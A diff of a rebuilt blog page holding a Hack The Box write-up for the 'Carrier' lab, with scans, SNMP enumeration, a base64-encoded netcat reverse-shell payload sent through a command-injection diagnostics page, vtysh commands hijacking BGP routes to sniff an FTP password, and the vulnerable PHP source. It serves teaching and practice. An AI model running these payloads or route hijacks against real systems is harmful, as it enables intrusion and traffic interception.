@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-US">
   <head>
-    <meta name="generator" content="Hugo 0.64.1" />
+    <meta name="generator" content="Hugo 0.101.0" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hack The Box Write-up - Carrier | text/plain</title>
@@ -53,10 +53,10 @@ root flag is now only one FTP download away. All in all a really interesting
 challenge and a great way to learn more about how the Internet actually works.
 " />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://dominicbreuker.com/post/htb_carrier/" />
-<meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322"/>
-<meta property="article:published_time" content="2019-03-18T00:00:00+01:00" />
-<meta property="article:modified_time" content="2019-03-18T00:00:00+01:00" />
+<meta property="og:url" content="https://dominicbreuker.com/post/htb_carrier/" /><meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322"/><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2019-03-18T00:00:00+00:00" />
+<meta property="article:modified_time" content="2019-03-18T00:00:00+00:00" />
+
 
     
 
@@ -67,6 +67,7 @@ challenge and a great way to learn more about how the Internet actually works.
 
     <meta name="theme-color" content="#000">
 
+    
     
     
     
@@ -243,7 +244,7 @@ figure a:hover {
     
       <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
     
-      <a itemprop="url" class="active" href="/post/"><span itemprop="name">Post</span></a>
+      <a itemprop="url" class="" href="/post/"><span itemprop="name">Post</span></a>
     
       <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
     
@@ -271,14 +272,9 @@ the route advertisements to direct the traffic to this mysterious FTP server
 over the compromised router. Dumping the traffic reveals the FTP password. The
 root flag is now only one FTP download away. All in all a really interesting
 challenge and a great way to learn more about how the Internet actually works.
-">
-<meta itemprop="datePublished" content="2019-03-18T00:00:00&#43;01:00" />
-<meta itemprop="dateModified" content="2019-03-18T00:00:00&#43;01:00" />
-<meta itemprop="wordCount" content="5138">
-<meta itemprop="image" content="https://source.unsplash.com/category/technology/2000x1322"/>
-
-
-
+"><meta itemprop="datePublished" content="2019-03-18T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2019-03-18T00:00:00+00:00" />
+<meta itemprop="wordCount" content="4948"><meta itemprop="image" content="https://source.unsplash.com/category/technology/2000x1322"/>
 <meta itemprop="keywords" content="ctf,infosec,hackthebox,write-up,BGP hijacking," />
     <script async src="/js/baffle.js"></script>
     <header>
@@ -288,12 +284,12 @@ challenge and a great way to learn more about how the Internet actually works.
   <circle cx="16" cy="16" r="14" />
   <path d="M16 8 L16 16 20 20" />
 </svg>
-<span>25 minute read</span>
+<span>24 minute read</span>
 <svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
   <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
 </svg>
 
-  Published: <time datetime="2019-03-18T00:00:00&#43;01:00">18 Mar, 2019</time>
+  Published: <time datetime="2019-03-18T00:00:00&#43;00:00">18 Mar, 2019</time>
 
 
       </p>
@@ -368,14 +364,14 @@ challenge and a great way to learn more about how the Internet actually works.
     <div itemprop="articleBody">
       <h1 id="port-scans">Port scans</h1>
 <p>A fast <a href="https://github.com/robertdavidgraham/masscan">masscan</a> scan returns only two open ports:</p>
-<pre><code> $ masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.105
+<pre tabindex="0"><code> $ masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.105
 ...
 Discovered open port 80/tcp on 10.10.10.105
 Discovered open port 22/tcp on 10.10.10.105
 </code></pre><p>With nmap we can see we are in front of a Ubuntu Linux box with OpenSSH and
 Apache web servers running. Version 2.4.18 of Apache suggests the box is likely
 Ubuntu Xenial (<a href="https://launchpad.net/ubuntu/+source/apache2">click</a>):</p>
-<pre><code> $ nmap -sV -sC -p 22,80 10.10.10.105
+<pre tabindex="0"><code> $ nmap -sV -sC -p 22,80 10.10.10.105
 ...
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
@@ -393,7 +389,7 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ...
 </code></pre><p>Interestingly, there is also an open UDP port serving SNMP via <a href="https://github.com/etingof/pysnmp">pysnmp</a>:</p>
-<pre><code> $ nmap -sU -sV -sC 10.10.10.105
+<pre tabindex="0"><code> $ nmap -sU -sV -sC 10.10.10.105
 PORT      STATE         SERVICE VERSION
 67/udp    open|filtered dhcps
 161/udp   open          snmp    SNMPv1 server; pysnmp SNMPv3 server (public)
@@ -412,25 +408,25 @@ find anything.</p>
 <h2 id="scanning">Scanning</h2>
 <p>First things first: run some fuzzing on the web server to discover hidden
 directories. I like <a href="https://github.com/xmendez/wfuzz">wfuzz</a>:</p>
-<pre><code> $ wfuzz --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.105/FUZZ
+<pre tabindex="0"><code> $ wfuzz --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.105/FUZZ
 ...
 ==================================================================
 ID      Response   Lines      Word         Chars          Payload
 ==================================================================
 
-000039:  C=301      9 L       28 W          310 Ch        &quot;img&quot;
-000121:  C=301      9 L       28 W          312 Ch        &quot;tools&quot;
-000222:  C=301      9 L       28 W          310 Ch        &quot;doc&quot;
-000550:  C=301      9 L       28 W          310 Ch        &quot;css&quot;
-000953:  C=301      9 L       28 W          309 Ch        &quot;js&quot;
-002771:  C=301      9 L       28 W          312 Ch        &quot;fonts&quot;
-005711:  C=301      9 L       28 W          312 Ch        &quot;debug&quot;
+000039:  C=301      9 L       28 W          310 Ch        &#34;img&#34;
+000121:  C=301      9 L       28 W          312 Ch        &#34;tools&#34;
+000222:  C=301      9 L       28 W          310 Ch        &#34;doc&#34;
+000550:  C=301      9 L       28 W          310 Ch        &#34;css&#34;
+000953:  C=301      9 L       28 W          309 Ch        &#34;js&#34;
+002771:  C=301      9 L       28 W          312 Ch        &#34;fonts&#34;
+005711:  C=301      9 L       28 W          312 Ch        &#34;debug&#34;
 </code></pre><p>A similar scan can be run to ensure we don&rsquo;t miss interesting files:</p>
-<pre><code> $ wfuzz --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,txt-pdf-php http://10.10.10.105/FUZZ.FUZ2Z
-000045:  C=200     63 L      105 W         1509 Ch        &quot;index - php&quot;
-007071:  C=302      0 L        0 W            0 Ch        &quot;tickets - php&quot;
-008781:  C=302      0 L        0 W            0 Ch        &quot;dashboard - php&quot;
-057168:  C=302      0 L        0 W            0 Ch        &quot;diag - php&quot;
+<pre tabindex="0"><code> $ wfuzz --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,txt-pdf-php http://10.10.10.105/FUZZ.FUZ2Z
+000045:  C=200     63 L      105 W         1509 Ch        &#34;index - php&#34;
+007071:  C=302      0 L        0 W            0 Ch        &#34;tickets - php&#34;
+008781:  C=302      0 L        0 W            0 Ch        &#34;dashboard - php&#34;
+057168:  C=302      0 L        0 W            0 Ch        &#34;diag - php&#34;
 </code></pre><h2 id="exploring">Exploring</h2>
 <p>With those scans running, we can open a browser and check things out manually.
 The first thing you see is a login page for a &ldquo;Lygthspeed&rdquo; system:</p>
@@ -479,7 +475,7 @@ directories such as &ldquo;img&rdquo;, &ldquo;css&rdquo; and the like, there is 
 <a href="http://10.10.10.105/debug">http://10.10.10.105/debug</a> we find a PHP info page
 telling us more about the PHP configuration (version 7.0.30).
 The page <a href="http://10.10.10.105/tools/remote.php">http://10.10.10.105/tools/remote.php</a>
-simply says &ldquo;License expired, exiting&hellip;&quot;.
+simply says &ldquo;License expired, exiting&hellip;&rdquo;.
 At <a href="http://10.10.10.105/doc">http://10.10.10.105/doc</a> we see a listing of a few
 PDF files.</p>
 
@@ -605,9 +601,9 @@ scan did not show SNMP initially, I&rsquo;ve wasted way too much time on
 brute-forcing. Don&rsquo;t make the same mistake.</p>
 <p>From the nmap scan we know it is SNMP version 1, so we can use <a href="https://linux.die.net/man/1/snmpwalk">snmapwalk</a>
 to enumerate like so:</p>
-<pre><code> $ snmpwalk -c public 10.10.10.105 -v 1
+<pre tabindex="0"><code> $ snmpwalk -c public 10.10.10.105 -v 1
 Created directory: /var/lib/snmp/mib_indexes
-SNMPv2-SMI::mib-2.47.1.1.1.1.11 = STRING: &quot;SN#NET_45JDX23&quot;
+SNMPv2-SMI::mib-2.47.1.1.1.1.11 = STRING: &#34;SN#NET_45JDX23&#34;
 End of MIB
 </code></pre><p>Devices usually return myriads of data points but here we get just one. &ldquo;SN#&rdquo;
 sounds a lot like a serial number and indeed, trying &ldquo;admin&rdquo; and &ldquo;NET_45JDX23&rdquo;
@@ -789,17 +785,17 @@ command. It even proves that we are root. Sounds like jackpot.</p>
 </style>
 
 <p>Getting a reverse shell is easy now. Encode a suitable payload:</p>
-<pre><code> $ echo &quot;;rm /tmp/x;mkfifo /tmp/x;cat /tmp/x|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.122 7001 &gt;/tmp/x&quot; | base64 -w 0
+<pre tabindex="0"><code> $ echo &#34;;rm /tmp/x;mkfifo /tmp/x;cat /tmp/x|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.122 7001 &gt;/tmp/x&#34; | base64 -w 0
 O3JtIC90bXAveDtta2ZpZm8gL3RtcC94O2NhdCAvdG1wL3h8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjEwLjE1LjEzMCA3MDAxID4vdG1wL3gK
 </code></pre><p>Now start a listener and use the payload in a new request. You should catch a
 shell:</p>
-<pre><code> $ nc -lnvp 7001
+<pre tabindex="0"><code> $ nc -lnvp 7001
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::7001
 Ncat: Listening on 0.0.0.0:7001
 Ncat: Connection from 10.10.10.105.
 Ncat: Connection from 10.10.10.105:51372.
-/bin/sh: 0: can't access tty; job control turned off
+/bin/sh: 0: can&#39;t access tty; job control turned off
 # id
 uid=0(root) gid=0(root) groups=0(root)
 # find / -name user.txt 2&gt;/dev/null
@@ -816,14 +812,14 @@ Note that there is no <code>python</code> installed but <code>python3</code> can
 <h1 id="shell-on-the-box">Shell on the box</h1>
 <h2 id="finding-quagga">Finding Quagga</h2>
 <p>An easy thing to notice is that a restore script runs every 10 minutes:</p>
-<pre><code>root@r1:~# cat /var/spool/cron/crontabs/root
+<pre tabindex="0"><code>root@r1:~# cat /var/spool/cron/crontabs/root
 # DO NOT EDIT THIS FILE - edit the master and reinstall.
 # (/tmp/crontab.m6zD7R/crontab installed on Mon Jul  2 16:40:23 2018)
 ...
 */10 * * * * /opt/restore.sh
 </code></pre><p>This script stops quagga, restores the configuration, and brings the service
 back up:</p>
-<pre><code>root@r1:~# cat /opt/restore.sh
+<pre tabindex="0"><code>root@r1:~# cat /opt/restore.sh
 #!/bin/sh
 systemctl stop quagga
 killall vtysh
@@ -832,7 +828,7 @@ cp /etc/quagga/bgpd.conf.orig /etc/quagga/bgpd.conf
 systemctl start quagga
 </code></pre><p>So what exactly is the configuration. For example, the BGP configuration file
 looks like this:</p>
-<pre><code>root@r1:~# cat /etc/quagga/bgpd.conf.orig
+<pre tabindex="0"><code>root@r1:~# cat /etc/quagga/bgpd.conf.orig
 !
 ! Zebra configuration saved from vty
 !   2018/07/02 02:14:27
@@ -874,14 +870,14 @@ connect to locally. To easy configuration, a tool called <code>vtysh</code> can 
 avoid jumping between sessions. See <a href="https://openmaniak.com/quagga_tutorial.php#vtysh">here</a>
 for a short intro. With a shell on the box, we can just use &ldquo;vtysh&rdquo; without
 being asked for a password:</p>
-<pre><code>root@r1:~# vtysh
+<pre tabindex="0"><code>root@r1:~# vtysh
 
 Hello, this is Quagga (version 0.99.24.1).
 Copyright 1996-2005 Kunihiro Ishiguro, et al.
 </code></pre><p>By printing the neighbors we can verify our assumptions about the topology of
 the autonomous systems. Indeed we seem to be AS 100 and connected to AS 200 and
 300:</p>
-<pre><code>r1# show bgp neigh
+<pre tabindex="0"><code>r1# show bgp neigh
 BGP neighbor is 10.78.10.2, remote AS 200, local AS 100, external link
   BGP version 4, remote router ID 10.255.255.2
   BGP state = Established, up for 00:02:40
@@ -892,7 +888,7 @@ BGP neighbor is 10.78.11.2, remote AS 300, local AS 100, external link
 ...
 </code></pre><p>Furthermore, printing the routes shows which networks can be reached via each
 of the neighbors and the corresponding local interfaces:</p>
-<pre><code>r1# show ip route
+<pre tabindex="0"><code>r1# show ip route
 Codes: K - kernel route, C - connected, S - static, R - RIP,
        O - OSPF, I - IS-IS, B - BGP, P - PIM, A - Babel,
        &gt; - selected route, * - FIB route
@@ -933,7 +929,7 @@ This is what the Quagga BGP routing daemon allows to configure.</p>
 numbers 100, 200 and 300. Each AS seems to have only a single router and we
 have the one of AS 100 under control. Usually, each AS would have many routers.
 The current configuration looks like so:</p>
-<pre><code>r1# sh run
+<pre tabindex="0"><code>r1# sh run
 Building configuration...
 
 Current configuration:
@@ -986,7 +982,7 @@ Finally, <code>ip forwarding</code> probably indicates that IP forwarding is ena
 exchange route advertisements like those defined above. An advertisement is an
 IP range (prefix) combined with a list of AS numbers (the path). For instance, the
 advertisements our router sends to AS 200 are these:</p>
-<pre><code>r1# show ip bgp neighbors 10.78.10.2 advertised-routes
+<pre tabindex="0"><code>r1# show ip bgp neighbors 10.78.10.2 advertised-routes
 BGP table version is 0, local router ID is 10.255.255.1
 Status codes: s suppressed, d damped, h history, * valid, &gt; best, = multipath,
               i internal, r RIB-failure, S Stale, R Removed
@@ -1095,7 +1091,7 @@ delivered to the FTP server. Return packets should usually go their normal
 route (but we will see it is not the case for this box since the router itself
 is the client). The configuration for the new advertisements is installed with
 &ldquo;vtysh&rdquo;:</p>
-<pre><code>r1# configure terminal
+<pre tabindex="0"><code>r1# configure terminal
 r1(config)# ip prefix-list hijack permit 10.120.15.0/25
 r1(config)# ip prefix-list hijack permit 10.120.15.128/25
 r1(config)# route-map to-as200 permit 10
@@ -1111,7 +1107,7 @@ r1(config-router)# network 10.120.15.128/25
 r1(config-router)# end
 </code></pre><p>To better understand this new configuration, print it out again to see it
 properly ordered and indented:</p>
-<pre><code>r1# sh run
+<pre tabindex="0"><code>r1# sh run
 Building configuration...
 
 Current configuration:
@@ -1181,7 +1177,7 @@ case. Only advertisements not matching &ldquo;hijack&rdquo; are permitted. This 
 filters the advertisements to AS 300.</p>
 <p>We can verify that with &ldquo;vtysh&rdquo;. Check the routes advertised to AS 200 like
 this:</p>
-<pre><code>r1# show ip bgp neighbors 10.78.10.2 advertised-routes
+<pre tabindex="0"><code>r1# show ip bgp neighbors 10.78.10.2 advertised-routes
 BGP table version is 0, local router ID is 10.255.255.1
 Status codes: s suppressed, d damped, h history, * valid, &gt; best, = multipath,
               i internal, r RIB-failure, S Stale, R Removed
@@ -1210,7 +1206,7 @@ Origin codes: i - IGP, e - EGP, ? - incomplete
 Total number of prefixes 18
 </code></pre><p>You see that it contains the two prefixes as expected. Compare it with the
 advertisements to AS 300, which do not contain them:</p>
-<pre><code>r1# show ip bgp neighbors 10.78.11.2 advertised-routes
+<pre tabindex="0"><code>r1# show ip bgp neighbors 10.78.11.2 advertised-routes
 BGP table version is 0, local router ID is 10.255.255.1
 Status codes: s suppressed, d damped, h history, * valid, &gt; best, = multipath,
               i internal, r RIB-failure, S Stale, R Removed
@@ -1240,7 +1236,7 @@ server. I brought a static version of <a href="https://www.tcpdump.org/">tcpdump
 the box and tuned in (there is one installed but it did not capture anything,
 no idea why&hellip;). Pick any of eth1 or eth2 but not both or you will see the
 packets twice:</p>
-<pre><code>root@r1:/dev/shm/.me# ./tcpdump -enni eth1 port 21
+<pre tabindex="0"><code>root@r1:/dev/shm/.me# ./tcpdump -enni eth1 port 21
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
 listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes
 13:58:01.240893 00:16:3e:5b:49:a9 &gt; 00:16:3e:8a:f2:4f, ethertype IPv4 (0x0800), length 74: 10.78.10.2.39156 &gt; 10.120.15.10.21: Flags [S], seq 238980382, win 2
@@ -1306,7 +1302,7 @@ your machine and open in <a href="https://www.wireshark.org/">Wireshark</a>.</p>
 <h2 id="ftp-login">FTP login</h2>
 <p>With the password and IP of the FTP server we can connect, enter passive mode and
 list files:</p>
-<pre><code>root@r1:/dev/shm/.me# ftp 10.120.15.10
+<pre tabindex="0"><code>root@r1:/dev/shm/.me# ftp 10.120.15.10
 Connected to 10.120.15.10.
 220 (vsFTPd 3.0.3)
 Name (10.120.15.10:root): root
@@ -1325,7 +1321,7 @@ ftp&gt; dir
 226 Directory send OK.
 </code></pre><p>There are two of them. The flag and a mysterious other file. Just
 download both:</p>
-<pre><code>ftp&gt; get root.txt
+<pre tabindex="0"><code>ftp&gt; get root.txt
 local: root.txt remote: root.txt
 227 Entering Passive Mode (10,120,15,10,247,238).
 150 Opening BINARY mode data connection for root.txt (33 bytes).
@@ -1347,8 +1343,8 @@ Check out the bonus section of you like.</p>
 <h2 id="ssh-to-ftp-server">SSH to FTP server</h2>
 <p>The credentials for the FTP server looked a lot like the root credentials
 for this server. There was also an SSH server running, so try logging in:</p>
-<pre><code>root@r1:/dev/shm/.me# ssh root@10.120.15.10
-root@10.120.15.10's password:
+<pre tabindex="0"><code>root@r1:/dev/shm/.me# ssh root@10.120.15.10
+root@10.120.15.10&#39;s password:
 Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-24-generic x86_64)
 ...
 Last login: Sat Mar  9 21:42:33 2019 from 10.120.15.1
@@ -1359,7 +1355,7 @@ as LXC is installed and multiple containers &ldquo;r1&rdquo;, &ldquo;r2&rdquo; a
 running.</p>
 <p>Inspecting the containers a bit more, we find that &ldquo;r2&rdquo; regularly performs the
 upload via a cron job. &ldquo;secretdata.txt&rdquo; is just the file it uploads:</p>
-<pre><code>root@carrier:~# cat /var/lib/lxd/storage-pools/default/containers/r2/rootfs/var/spool/cron/crontabs/root
+<pre tabindex="0"><code>root@carrier:~# cat /var/lib/lxd/storage-pools/default/containers/r2/rootfs/var/spool/cron/crontabs/root
 ...
 */1 * * * * ftp -n -p 10.120.15.10 &lt; /root/ftpcommands.txt
 root@carrier:~# cat /var/lib/lxd/storage-pools/default/containers/r2/rootfs/root/ftpcommands.txt
@@ -1374,14 +1370,14 @@ root@carrier:~# cat
 vulnerable diagnostics page. Printing it out shows how the insecure handling of
 user input allows command injection to a remote host it connects to via SSH.
 This is how we got from the website to the router.</p>
-<pre><code>root@carrier:/var/lib/lxd/storage-pools/default/containers/web/rootfs/var/www/html# cat diag.php
+<pre tabindex="0"><code>root@carrier:/var/lib/lxd/storage-pools/default/containers/web/rootfs/var/www/html# cat diag.php
 ...
 &lt;?php
-$check = base64_decode($_POST[&quot;check&quot;]);
+$check = base64_decode($_POST[&#34;check&#34;]);
 if ($check) {
-    exec(&quot;ssh -i /var/www/.ssh/id_rsa root@10.99.64.2 'ps waux | grep &quot; . $check . &quot; | grep -v grep'&quot;, $output);
+    exec(&#34;ssh -i /var/www/.ssh/id_rsa root@10.99.64.2 &#39;ps waux | grep &#34; . $check . &#34; | grep -v grep&#39;&#34;, $output);
     foreach($output as $line) {
-        echo &quot;&lt;p&gt;&quot; . $line . &quot;&lt;/p&gt;&quot;;
+        echo &#34;&lt;p&gt;&#34; . $line . &#34;&lt;/p&gt;&#34;;
     }
 }
 ?&gt;
@@ -1418,7 +1414,7 @@ from shortest path routing and how policies are designed.</li>
       by <span itemprop="author">Dominic Breuker</span>
     
   
-  <time itemprop="datePublished" datetime="2019-03-18T00:00:00&#43;01:00">
+  <time itemprop="datePublished" datetime="2019-03-18T00:00:00&#43;00:00">
     18 Mar, 2019
   </time>
   
@@ -1427,7 +1423,7 @@ from shortest path routing and how policies are designed.</li>
   
     and tagged <a href="/tags/bgp-hijacking/">BGP hijacking</a>, <a href="/tags/ctf/">ctf</a>, <a href="/tags/hackthebox/">hackthebox</a>, <a href="/tags/infosec/">infosec</a> and <a href="/tags/write-up/">write-up</a>
   
-  using <span itemprop="wordCount">5138</span> words.
+  using <span itemprop="wordCount">4948</span> words.
 </p>
 
       
@@ -1438,7 +1434,7 @@ from shortest path routing and how policies are designed.</li>
     <ul>
       
         <li><a href="/post/htb_access/">Hack The Box Write-up - Access</a>
-        <time datetime="11M">11 minutes</time>
+        <time datetime="10M">10 minutes</time>
       
         <li><a href="/post/htb_active/">Hack The Box Write-up - Active</a>
         <time datetime="12M">12 minutes</time>
@@ -1456,7 +1452,7 @@ from shortest path routing and how policies are designed.</li>
         <time datetime="12M">12 minutes</time>
       
         <li><a href="/post/htb_calamity/">Hack The Box Write-up - Calamity</a>
-        <time datetime="10M">10 minutes</time>
+        <time datetime="9M">9 minutes</time>
       
     </ul>
   </aside>
